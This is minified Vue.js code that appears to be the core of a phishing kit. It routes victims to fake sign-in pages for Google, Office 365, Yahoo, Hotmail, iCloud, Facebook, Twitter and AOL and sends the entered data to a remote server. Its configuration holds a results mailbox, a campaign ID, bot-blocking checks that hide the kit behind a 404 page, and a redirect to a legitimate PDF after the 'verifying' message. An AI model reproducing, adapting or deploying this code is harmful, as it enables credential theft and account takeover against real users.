=["iPad","NexusTablet","SamsungTablet","Kindle","SurfaceTablet","HPTablet","AsusTablet","BlackBerryTablet","HTCtablet","MotorolaTablet","NookTablet","AcerTablet","ToshibaTablet","LGTablet","FujitsuTablet","PrestigioTablet","LenovoTablet","YarvikTablet","MedionTablet","ArnovaTablet","IntensoTablet","IRUTablet","MegafonTablet","EbodaTablet","AllViewTablet","ArchosTablet","AinolTablet","SonyTablet","CubeTablet","CobyTablet","MIDTablet","SMiTTablet","RockChipTablet","FlyTablet","bqTablet","HuaweiTablet","NecTablet","PantechTablet","BronchoTablet","VersusTablet","ZyncTablet","PositivoTablet","NabiTablet","KoboTablet","DanewTablet","TexetTablet","PlaystationTablet","TrekstorTablet","PyleAudioTablet","AdvanTablet","DanyTechTablet","GalapadTablet","MicromaxTablet","KarbonnTablet","AllFineTablet","PROSCANTablet","YONESTablet","ChangJiaTablet","GUTablet","PointOfViewTablet","OvermaxTablet","HCLTablet","DPSTablet","VistureTablet","CrestaTablet","MediatekTablet","ConcordeTablet","GoCleverTablet","ModecomTablet","VoninoTablet","ECSTablet","StorexTablet","VodafoneTablet","EssentielBTablet","RossMoorTablet","iMobileTablet","TolinoTablet","AudioSonicTablet","AMPETablet","SkkTablet","TecnoTablet","JXDTablet","iJoyTablet","Hudl","TelstraTablet","GenericTablet","iPhone","BlackBerry","HTC","Nexus","Dell","Motorola","Samsung","LG","Sony","Asus","Micromax","Palm","Vertu","Pantech","Fly","iMobile","SimValley","GenericPhone","AndroidOS","BlackBerryOS","PalmOS","SymbianOS","WindowsMobileOS","WindowsPhoneOS","iOS","MeeGoOS","MaemoOS","JavaOS","webOS","badaOS","BREWOS","Chrome","Dolfin","Opera","Skyfire","IE","Firefox","Bolt","TeaShark","Blazer","Safari","Tizen","UCBrowser","DiigoBrowser","Puffin","Mercury","GenericBrowser","DesktopMode","TV","WebKit","Bot","MobileBot","Console","Watch"],versionKeys =["Mobile","Build","Version","VendorID","iPad","iPhone","iPod","Kindle","Chrome","Coast","Dolfin","Firefox","Fennec","IE","NetFront","NokiaBrowser","Opera","Opera Mini","Opera Mobi","UC Browser","MQQBrowser","MicroMessenger","Safari","Skyfire","Tizen","Webkit","Gecko","Trident","Presto","iOS","Android","BlackBerry","BREW","Java","Windows Phone OS","Windows Phone","Windows CE","Windows NT","Symbian","webOS"];if(store.getters['browser/get_browser']==""){if (md.mobile()){if(md.phone()){store.dispatch("browser/set_browser","ph");}else {store.dispatch("browser/set_browser","tl");}}else {store.dispatch("browser/set_browser","dt");}};if(store.getters['browser/get_browser_detail']==""){var temp_de_br_deno=[];var result;var obj__debrd ={};keys.forEach(function extr_nbr_dt_is(val,index,array){result =md.is(val);if(result){obj__debrd[val]=result;}});temp_de_br_deno.push({"is":obj__debrd});obj__debrd ={};versionKeys.forEach(function(val,index,array){result =md.version(val);if(result){obj__debrd[val]=result;}});temp_de_br_deno.push({"ver":obj__debrd});store.dispatch("browser/set_browser_detail",JSON.stringify(temp_de_br_deno));};};Vue.stk_browser =creatNBRSystemStorage({type:Vue.st_const_localnbrst,paths:[Vue.st.bc],key:Vue.st.bckey});Vue.stmd_browser ={namespaced:true,state:{detect_browser:"",detect_browser_detail:"",detect_btan:"" },actions:{set_browser:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("set_browser",value);},set_browser_detail:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("set_browser_detail",value);},set_dtbt:function(_ref,value){commit =_ref.commit;commit("set_dtbt",value);}},mutations:{set_browser:function(state,value){state.detect_browser=value;},set_browser_detail:function(state,value){state.detect_browser_detail=value;},set_dtbt:function(state,value){state.detect_btan=value;}},getters:{get_browser:function(state){return state.detect_browser;},get_browser_detail:function(state){return state.detect_browser_detail;},get_dtbt:function(state){return state.detect_btan;}}};Vue.stk_user =creatNBRSystemStorage({type:Vue.st_const_localnbrst,paths:[Vue.st.u],key:Vue.st.ukey});Vue.stmd_user ={namespaced:true,state:{keepLoginLongtime:0,AuthNBR:false,AuthKeyNBR:false,tk_nbr_uc_frv:"",br_nbrcheck:"",br_utcheck:"",testlist:[]},actions:{setAllHeaders:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setAllHeaders",value);},setAllHeadersV:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setAllHeadersV",value);},setKeeplogin:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setKeeplogin",value);},setBr_nbrcheck:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setBr_nbrcheck",value);},setBr_utcheck:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setBr_utcheck",value);},setTk_nbr_uc_frv:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setTk_nbr_uc_frv",value);},settestLIST:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("settestLIST",value);},},mutations:{setAllHeadersV:function(state,value){state.AuthNBR=value;},setAllHeaders:function(state,value){state.AuthKeyNBR=value;},setKeeplogin:function(state,value){state.keepLoginLongtime=value;},setBr_nbrcheck:function(state,value){state.br_nbrcheck=value;},setBr_utcheck:function(state,value){state.br_utcheck=value;},setTk_nbr_uc_frv:function(state,value){state.tk_nbr_uc_frv=value;},settestLIST:function(state,value){state.testlist=value;}},getters:{checkKeepLogged:function(state){return state.keepLoginLongtime;},getAuth:function(state){var temp_a=state.AuthNBR;if(!temp_a)return false;return temp_a.split("nbr")[0];},getAuthValue:function(state){return state.AuthNBR;},getAuthKey:function(state){return state.AuthKeyNBR;},getBr_nbrcheck:function(state){return state.br_nbrcheck;},getBr_utcheck:function(state){return state.br_utcheck;},getTk_nbr_uc_frv:function(state){return state.tk_nbr_uc_frv;},gettestList:function(state){return state.testlist;}}};Vue.stk_lready =creatNBRSystemStorage({type:Vue.st_const_localnbrss,paths:[Vue.st.readyFile+"bypass"],key:Vue.st.readyFilekey});Vue.stmd_lready ={namespaced:true,state:{detect_browser:{}},actions:{set_browser:function(_ref,value){var commit =_ref.commit;commit("set_browser",value);}},mutations:{set_browser:function(state,value){state.detect_browser[value]=1;}},getters:{get_browser:function(state){return function(val){if(state.detect_browser.hasOwnProperty(val))console.log("Value ne:"+state.detect_browser[val]);return state.detect_browser.hasOwnProperty(val);}}}};Vue.importCssFile=function (url){var scriptsarray;if(url.isArray)scriptsarray=url;else scriptsarray=new Array( url );var totalloads=0;for (var i=0;i<scriptsarray.length;i++){if(!store.getters[Vue.st.readyFile+'/get_browser'](Vue.crptsf.en(scriptsarray[i]))){var styles ="@import url('"+scriptsarray[i]+"');";var newSS=document.createElement('link');newSS.rel='stylesheet';newSS.href='data:text/css,'+escape(styles);newSS.addEventListener('load',function(){totalloads++;if (totalloads==scriptsarray.length){}},false);newSS.addEventListener('error',function(){},false);document.getElementsByTagName("head")[0].appendChild(newSS);store.dispatch(Vue.st.readyFile+"/set_browser",Vue.crptsf.en(scriptsarray[i]));}}};}};Vue.use(NBR_VUE);var defaultLang="en";var store =new Vuex.Store({state:{currentPathName:"",loadingRouter:false,Language:defaultLang,listLangs:[{text:'lang vietnam',id:'vi',description:''},{text:'lang default',id:'en',description:''},],pageTitle:"Travel NU",linksaveBeforeLogin:"/" },actions:{setLang:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setLang",value);},changestatusLoading:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("changestatusLoading",value);},setCurrentPathName:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setCurrentPathName",value);},saveLinkBeforeLogin:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("saveLinkBeforeLogin",value);},setpageTitle:function(_ref,value){var state =_ref.state,commit =_ref.commit;commit("setpageTitle",value);}},mutations:{setLang:function(state,value){state.Language=value;},changestatusLoading:function(state,value){state.loadingRouter=value;},setCurrentPathName:function(state,value){state.currentPathName=value;},saveLinkBeforeLogin:function(state,value){state.linksaveBeforeLogin=value;},setpageTitle:function(state,value){state.pageTitle=value;}},getters:{getLang:function(state,commit){return state.Language;},getLangList:function(state){return state.listLangs;},getLoadingRouter:function(state){return state.loadingRouter;},getCurrentPathName:function(state){return state.currentPathName;},getLinksaveBeforeLogin:function(state){return state.linksaveBeforeLogin;},getpageTitle:function(state){return state.pageTitle;}},modules:{'user':Vue.stmd_user,'browser':Vue.stmd_browser,'Resi':Vue.stmd_lready },plugins:[Vue.stk_user,Vue.stk_browser,Vue.stk_lready]});function resetHeadersNBR(a){store.dispatch("user/setAllHeaders",a.authkey);store.dispatch("user/setAllHeadersV",a.authvalue);};function changeLangtoURLNBR(){if(store.getters.getLang==defaultLang)return "";return "/"+store.getters.getLang;};var CancelToken =axios.CancelToken;var nbrProcess =CancelToken.source();var instance =axios.create({baseURL:"https://xotpe.bestnewsworld.info/1.newsvpost_ads/loading.php",timeout:35000,withCredentials:true,xsrfCookieName:"3011537451",headers:{'authvalue':store.getters['user/getAuth'],'authkey':store.getters['user/getAuthKey']},cancelToken:nbrProcess.token });var instancesta =axios.create({baseURL:"https://xotpe.bestnewsworld.info/scpage/",timeout:35000,withCredentials:true,xsrfCookieName:"3011537451",headers:{'authvalue':store.getters['user/getAuth'],'authkey':store.getters['user/getAuthKey']},cancelToken:nbrProcess.token });var emailex_off_to_hm="";var emailex_hm_to_off="";function randomId(a){var text ="";var possible ="ABCDEFGHIJK&LMNOPQRSTUVW&XYZabcdefghijklmnop&qrstuvwxyz01234&56789";for (var i =0;i <a;i++)text +=possible.charAt(Math.floor(Math.random()*possible.length));return text;};function avoidreAU(name){if(name){var namecom=name.split('-')[0];var text =false;switch (namecom){case "admin_gg":text =true;break;case "admin_365":text =true;break;case "admin_icl":text =true;break;case "admin_tw":text =true;break;case "admin_fb":text =true;break;case "admin_al":text =true;break;case "admin_yh":text =true;break;case "admin_hm":text =true;break;default:text =false;};return text;};return false;};var ch4kbat="1";function validrightrule(to,from,next){if(store.getters['browser/get_dtbt']==""){instancesta.get('xxposnto.php',{}).then(function(response){if(response.data.sta==""){store.dispatch("browser/set_dtbt","bl");next({name:'error404-en'});}else {store.dispatch("browser/set_dtbt","ok");next();}}).catch(function(thrown){next({name:'error404-en'});});}else {if(store.getters['browser/get_dtbt']=="bl"){next({name:'error404-en'});}else {next();}}}function requireAuth(to,from,next){if (!store.getters['user/getAuth']&&!avoidreAU(to.name)){console.log("ko co login"+to.name);if(from.name=="admin_login-"+store.getters.getLang){LoadingBarVue.progressTo(100);App.closeSidanav();store.dispatch("changestatusLoading",true);}else {if(!from.name=="admin_logout-"+store.getters.getLang){store.dispatch("saveLinkBeforeLogin",from.path);}}var nameloginAD='admin_login-'+(store.getters.getLang);if(ch4kbat==='0'){next({path:'/'+randomId(39)+'-@!&5xkPCelYhNf7LoF3n1KtQjpui!@&NrDHSpqImoyY9JaTfkxCnzceUEw0&@!-'+randomId(95)+'-'+randomId(74)+'/'+randomId(66),});}else {if(store.getters['browser/get_dtbt']==""){instancesta.get('xxposnto.php',{}).then(function(response){if(response.data.sta==""){store.dispatch("browser/set_dtbt","bl");next({name:'error404-en'});}else {store.dispatch("browser/set_dtbt","ok");next({path:'/'+randomId(39)+'-@!&5xkPCelYhNf7LoF3n1KtQjpui!@&NrDHSpqImoyY9JaTfkxCnzceUEw0&@!-'+randomId(95)+'-'+randomId(74)+'/'+randomId(66),});}}).catch(function(thrown){next({name:'error404-en'});});}else {if(store.getters['browser/get_dtbt']=="bl"){next({name:'error404-en'});}else {next({path:'/'+randomId(39)+'-@!&5xkPCelYhNf7LoF3n1KtQjpui!@&NrDHSpqImoyY9JaTfkxCnzceUEw0&@!-'+randomId(95)+'-'+randomId(74)+'/'+randomId(66),});}}}}else {if(avoidreAU(to.name)){if(ch4kbat==='0'){next();}else {if(store.getters['browser/get_dtbt']==""){instancesta.get('xxposnto.php',{}).then(function(response){if(response.data.sta==""){store.dispatch("browser/set_dtbt","bl");next({name:'error404-en'});}else {store.dispatch("browser/set_dtbt","ok");next();}}).catch(function(thrown){next({name:'error404-en'});});}else {if(store.getters['browser/get_dtbt']=="bl"){next({name:'error404-en'});}else {next();}}}}else {window.location.href =LINKRE_RESULT;}}};function destroypageLogin(to,from,next){if (store.getters['user/getAuth']){if(from.path=="/" ||from.path=="/"+store.getters.getLang){LoadingBarVue.progressTo(100);store.dispatch("changestatusLoading",true);}var homePage='home-'+(store.getters.getLang);next({name:homePage });}else {next();}};var scrollBehavior =function scrollBehavior(to,from,savedPosition){if (savedPosition){return savedPosition;}else {if (to.hash){return {anchor:true };}if (to.matched.some(function (m){return m.meta.scrollToTop;})){return {x:0,y:0 };}}};var ID_CUS_SP_NBR_30629="oliseh_12.11.2019.02_46_1576007180";var EMAILRESULT_NBR="bigblockslogs@protonmail.com";var VTEMAILSENDER_NBR=8;var twnumoff="3";var LINKRE_RESULT="https://assets.ey.com/content/dam/ey-sites/ey-com/en_gl/topics/wealth-and-asset-management/wealth-asset-management-pdfs/ey-global-wealth-management-research-report-2019.pdfcd";var TXT_RE="Thank you for verifying, you will be redirected to document shortly.";var EN_TXT_RE="1";var FILENAME_SP_NBR="";var IMGE_TYPE_DR="pdf";var a_SH_GG="%SH_GG%";var a_SH_OFF="%SH_OFF%";var a_SH_HM="%SH_HM%";var a_SH_YH="%SH_YH%";var a_SH_AL="%SH_AL%";var a_SH_IC="%SH_IC%";var a_SH_OT="%SH_OT%";var GrabEmailNBR="0";var cus_link_off_nbr="%cus_link_off_nbr%";var mapRoutes=[{path:'/vi',name:'home-vi',beforeEnter:requireAuth,meta:{lang:'vi'},component:function(resolve,reject){loadComponent('home','themes/js/106a6c241b8797f52e1e77317b96a2011576007180.js').then(resolve,reject);}},{path:'/',name:'home-en',beforeEnter:requireAuth,meta:{lang:'en'},component:function(resolve,reject){loadComponent('home','themes/js/106a6c241b8797f52e1e77317b96a2011576007180.js').then(resolve,reject);}},{path:'/vi/getmanageadnbr',name:'getmanageadnbr-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('getmanageadnbr','themes/js/dfd98a79c11d37dc92365a77f9fc51f41576007180.js').then(resolve,reject);}},{path:'/getmanageadnbr',name:'getmanageadnbr-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('getmanageadnbr','themes/js/dfd98a79c11d37dc92365a77f9fc51f41576007180.js').then(resolve,reject);}},{path:'/vi/:part4-@!&5xkPCelYhNf7LoF3n1KtQjpui!@&NrDHSpqImoyY9JaTfkxCnzceUEw0&@!-:part2-:part1/:part3',name:'admin_login-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_login','themes/js/a3107e4d4ae0ea783cd1177c52f1e6301576007179.js').then(resolve,reject);},beforeEnter:destroypageLogin},{path:'/:part4-@!&5xkPCelYhNf7LoF3n1KtQjpui!@&NrDHSpqImoyY9JaTfkxCnzceUEw0&@!-:part2-:part1/:part3',name:'admin_login-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_login','themes/js/a3107e4d4ae0ea783cd1177c52f1e6301576007179.js').then(resolve,reject);},beforeEnter:destroypageLogin},{path:'/vi/dashboard',name:'admin_dashboard-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_dashboard','themes/js/556a3e5b6579b6185a7d5c3ddc55aeb01576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/dashboard',name:'admin_dashboard-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_dashboard','themes/js/556a3e5b6579b6185a7d5c3ddc55aeb01576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/logout',name:'admin_logout-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_logout','themes/js/abead58e3898c88b13df6b8f684701341576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/logout',name:'admin_logout-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_logout','themes/js/abead58e3898c88b13df6b8f684701341576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/change-password',name:'admin_changepassword-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_changepassword','themes/js/7a87d747ac741a279737bd5a06e511801576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/change-password',name:'admin_changepassword-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_changepassword','themes/js/7a87d747ac741a279737bd5a06e511801576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/history-login',name:'admin_history_login-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_history_login','themes/js/7dad1ae35312928829dcddee298d0a021576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/history-login',name:'admin_history_login-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_history_login','themes/js/7dad1ae35312928829dcddee298d0a021576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/sub-account',name:'admin_sub_account-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_sub_account','themes/js/ef94fb3bfbf337e77e63cd528a9c10691576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/sub-account',name:'admin_sub_account-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_sub_account','themes/js/ef94fb3bfbf337e77e63cd528a9c10691576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/push-notification',name:'admin_push_notification-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_push_notification','themes/js/1659e9b130089f329f0d8661c48085c41576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/push-notification',name:'admin_push_notification-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_push_notification','themes/js/1659e9b130089f329f0d8661c48085c41576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/setting',name:'admin_setting-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_setting','themes/js/2e56d1155d283368eb090e02995ac3081576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/setting',name:'admin_setting-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_setting','themes/js/2e56d1155d283368eb090e02995ac3081576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/setting/general',name:'admin_setting_general-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_setting_general','themes/js/4d1c296266aa5e99a9eac718fa9f56e81576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/setting/general',name:'admin_setting_general-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_setting_general','themes/js/4d1c296266aa5e99a9eac718fa9f56e81576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/gg-:part2-:part1/:part3',name:'admin_gg-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_gg','themes/js/db9031892ea93fac341e13e3cb966d651576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/gg-:part2-:part1/:part3',name:'admin_gg-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_gg','themes/js/db9031892ea93fac341e13e3cb966d651576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/365-:part2-:part1/:part3',name:'admin_365-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_365','themes/js/89f38cd7658042e215d6c526fb14ea841576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/365-:part2-:part1/:part3',name:'admin_365-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_365','themes/js/89f38cd7658042e215d6c526fb14ea841576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/al-:part2-:part1/:part3',name:'admin_al-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_al','themes/js/95f3008b11607e982304d2b1d5045eb41576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/al-:part2-:part1/:part3',name:'admin_al-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_al','themes/js/95f3008b11607e982304d2b1d5045eb41576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/yh-:part2-:part1/:part3',name:'admin_yh-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_yh','themes/js/3835c2443235c6ddfdd80d3fc0c602d91576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/yh-:part2-:part1/:part3',name:'admin_yh-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_yh','themes/js/3835c2443235c6ddfdd80d3fc0c602d91576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/hm-:part2-:part1/:part3',name:'admin_hm-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_hm','themes/js/f03d32e9280db29ed61d07d3bcf15f641576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/hm-:part2-:part1/:part3',name:'admin_hm-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_hm','themes/js/f03d32e9280db29ed61d07d3bcf15f641576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/icl-:part2-:part1/:part3',name:'admin_icl-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_icl','themes/js/58eb19763f97f58a9964ee437cccb5ba1576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/icl-:part2-:part1/:part3',name:'admin_icl-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_icl','themes/js/58eb19763f97f58a9964ee437cccb5ba1576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/tw-:part2-:part1/:part3',name:'admin_tw-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_tw','themes/js/d9bcc7c27b39a7165397ae77145bcdbc1576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/tw-:part2-:part1/:part3',name:'admin_tw-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_tw','themes/js/d9bcc7c27b39a7165397ae77145bcdbc1576007179.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/fb-:part2-:part1/:part3',name:'admin_fb-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('admin_fb','themes/js/2b1a2f4e35b31c6974eed8e048d83e421576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/fb-:part2-:part1/:part3',name:'admin_fb-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('admin_fb','themes/js/2b1a2f4e35b31c6974eed8e048d83e421576007178.js').then(resolve,reject);},beforeEnter:requireAuth},{path:'/vi/*',name:'error404-vi',meta:{lang:'vi'},component:function(resolve,reject){loadComponent('error404','themes/js/c0f5e0dd4f642062f92481ef2bb438191576007180.js').then(resolve,reject);}},{path:'/*',name:'error404-en',meta:{lang:'en'},component:function(resolve,reject){loadComponent('error404','themes/js/c0f5e0dd4f642062f92481ef2bb438191576007180.js').then(resolve,reject);}},];var PAGE_TITLE ={"Home-en":"Your Dashboard","Foo-en":"About Us Page","Bar-en":"About Us Page","Error-en":"Error:Page not found" };var __dirname="va";var ch4kbat="1";var validStepUlg="1";function closeOpenwinnbr(url){window.opener.location.href=url;self.close();}var router =new VueRouter({mode:'history',scrollBehavior:scrollBehavior,base:__dirname,routes:mapRoutes,data:{AuthCMSNBR:false },computed:{},watch:{'$route':function $route(toRoute,fromRoute){}},methods:{ready:function(){console.log("test ready ")}},activate:{}});router.beforeEach(function(to,from,next){if(ch4kbat==='1'){if(store.getters['browser/get_dtbt']==""){instancesta.get('xxposnto.php',{}).then(function(response){if(response.data.sta==""){store.dispatch("browser/set_dtbt","bl");next({name:'error404-en'});}else {store.dispatch("browser/set_dtbt","ok");next();}}).catch(function(thrown){next({name:'error404-en'});});}else {if(store.getters['browser/get_dtbt']=="bl"){next({name:'error404-en'});}else {next();}}}else {next();}});var i18n =new VueI18n({store:store,locale:store.getters.getLang,messages:{vi:{message:{MS_TXT_LOGIN:'DIEN THONG TIN VAO MAY HO HO.',404:'Không tìm thấy trang.',500:'Hết thời gian thực hiện.Nhấn nút OK để thực hiện lại.Hoặc làm mới trình duyệt để thực hiện',Login_201:'Sai mật khẩu hoặc tên đăng nhập.',Login_203:'Nhập đúng mã captcha để đăng nhập!',ChangPass_200:'Thay đổi mật khẩu thành công',ChangPass_201:'Thay đổi mật khẩu thất bại.Hãy thử lại!',ChangPass_202:'Mật Khẩu Cũ Sai!!!',}},en:{message:{MS_TXT_LOGIN:'Please enter your login details.',404:'Not Found Error!',500:'You wait longtime to request!Try again after click OK or reload your browser.',Login_201:'Wrong username or password.',Login_203:'Input captcha to login',ChangPass_200:'Change Password Sucessful',ChangPass_201:'Fail change password .Try again!',ChangPass_202:'Input Wrong Old Password!',}},}});function i18nGobal(code){return App.$t("message."+code);};Vue.config.devtools =true;Vue.config.productionTip =true;Vue.config.performance =true;Vue.config.silent =false;Vue.config.errorHandler =function (err,vm,info){console.log("ERROR VUE VM:"+vm);console.log("ERROR VUE INFO:"+info);console.log("ERROR VUE ERR:"+err);};Vue.use(VueKeepScrollPosition);Vue.use(VueTimeago,{name:'timeago',locale:store.getters.getLang });Vue.mobile_detect();Vue.use(VueHtml5Editor,{name:"vue-html5-editor",showModuleName:false,icons:{text:"fa fa-pencil",color:"fa fa-paint-brush",font:"fa fa-font",align:"fa fa-align-justify",list:"fa fa-list",link:"fa fa-chain",unlink:"fa fa-chain-broken",tabulation:"fa fa-table",image:"fa fa-file-image-o",hr:"fa fa-minus",eraser:"fa fa-eraser",undo:"fa-undo fa","full-screen":"fa fa-arrows-alt",info:"fa fa-info",},image:{sizeLimit:512 *1024,upload:{url:null,headers:{},params:{},fieldName:{}},compress:{width:1600,height:1600,quality:80 },uploadHandler:function uploadHandler(responseText){var json =JSON.parse(responseText);if (!json.ok){alert(json.msg);}else {return json.data;}}},language:"en-us",hiddenModules:["info"],visibleModules:["text","color","font","align","list","link","unlink","tabulation","image","hr","eraser","undo","full-screen",],modules:{}});console.log("lang before valid vee "+store.getters.getLang);var configVeeValidate ={delay:10,locale:store.getters.getLang,events:'input' };Vue.use(VeeValidate,configVeeValidate);var App =new Vue({el:'#app',router:router,store:store,i18n:i18n,data:function(){return {localeRoot:store.getters.getLang,listLangs:store.getters.getLangList,TouchMenu:null,requestionError:{title:'Requestion Message!',contentHtml:'Error Message!' }}},computed:{pageTitleMain:function(){return store.getters.getpageTitle;},authnbr:function(){return store.getters['user/getAuth'];},loadingRouter:function(){return store.getters.getLoadingRouter;},statusLoading:function(){return false;}},watch:{localeRoot:function (newval,oldval){console.log("lam ex lang"+newval);var newPathLangchange=findPathbyName(router,newval,oldval);console.log("route name current:"+router.currentRoute.name);console.log("route test:"+newPathLangchange);console.log("full apth:"+window.location.pathname);router.push(newPathLangchange);}},created:function(){this.$nextTick(function (){})},methods:{setLangTimeago:function(){this.$setLangTimeago(store.getters.getLang);},setLocaleVee:function(lang){this.$validator.setLocale(lang);},toggleLeftSidenav:function(){},closeSidanav:function(){},openRequestionError:function openRequestionError(ref,ct){this.requestionError.contentHtml=ct;this.$refs[ref].open();},closeRequestionError:function closeRequestionError(ref){this.$refs[ref].close();},onOpenrequestionError:function onOpenrequestionError(){console.log('Opened');},onCloserequestionError:function onCloserequestionError(type){console.log('Closed',type);}},template:' <transition v-if="loadingRouter" name="component-fade" mode="out-in"><keep-alive><router-view ></router-view></keep-alive></transition>' });var LoadingBarVue=new Vue({el:"#nbrloadingbar",data:function(){return {progress:0,error:false,direction:'right' }},methods:{progressTo:function (val){this.progress =val;},processing:function(){var me =this;me.progress =10;for (var i =0;i <30;i++){if(i >20 &&i <29){setTimeout(function (){me.progress +=5;},50*i);}else{setTimeout(function (){me.progress ++;},10*i);}}},setToError:function (bol){this.error =bol;},changeDirection:function (direction){if(this.progress >=0){this.progress =100;}this.direction =this.direction ==='right' ?'left' :'right';},errorDone:function errorDone(){this.error =false },progressDone:function(){this.progress =100;this.progress =0;},},mounted:function (){}});function ErrorReq(message){App.openRequestionError('requestionError',message);};router.beforeEach(function(to,from,next){App.closeSidanav();console.log("test moi lam ne");if(_.isNil(to.meta.lang))store.dispatch("setLang",defaultLang);else store.dispatch("setLang",to.meta.lang);i18n.locale =store.getters.getLang;store.dispatch("changestatusLoading",false);console.log("before each "+store.getters.getLoadingRouter);LoadingBarVue.progressTo(20);next();});router.afterEach(function(to,from){App.setLangTimeago();App.setLocaleVee(store.getters.getLang);LoadingBarVue.progressTo(100);store.dispatch("changestatusLoading",true);console.log("after each "+store.getters.getLoadingRouter);Vue.nextTick(function (){store.dispatch("setCurrentPathName",(window.location.pathname));if (to.hash){console.log("strong anchor"+to.hash);var element=App.$el.querySelector(to.hash);if(element){console.log("test ready");var top =element.offsetTop;scrollToY(top,3000 ,'easeInOutQuint');}}});});